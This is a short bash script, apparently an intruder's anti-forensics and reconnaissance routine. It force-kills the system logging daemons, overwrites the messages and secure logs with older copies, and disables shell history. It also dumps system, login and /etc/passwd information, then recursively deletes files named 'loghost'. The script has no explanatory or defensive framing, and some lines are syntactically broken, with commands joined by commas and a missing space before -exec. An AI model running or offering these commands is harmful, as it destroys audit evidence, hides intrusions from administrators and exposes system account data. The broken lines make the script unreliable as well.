#!/bin/bash
killall -9 syslogd klogd
mv /var/log/messages.1 /var/log/messages
mv /var/log/secure.1 /var/log/secure
unset HISTFILE
uname -a, w, last -10, cat /etc/passwd /etc/inetd.conf
find . -name "loghost"-exec rm -rf {} \;
